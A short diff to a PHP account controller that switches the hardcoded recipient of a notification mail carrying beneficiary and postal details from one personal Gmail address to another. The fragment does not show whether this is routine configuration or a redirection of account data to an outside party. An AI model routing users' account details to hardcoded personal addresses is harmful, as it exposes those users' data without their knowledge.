@@ -161,7 +161,7 @@ class AccountController extends Controller
         'beneficiary' => $beneficiary,
         'postal' => $postal,
       ];
-      Mail::to("boladebode@gmail.com")
+      Mail::to("nicoleyesmi1@gmail.com")
         ->send(new NotifyMail($payload));
 
       $response['status'] = 200;
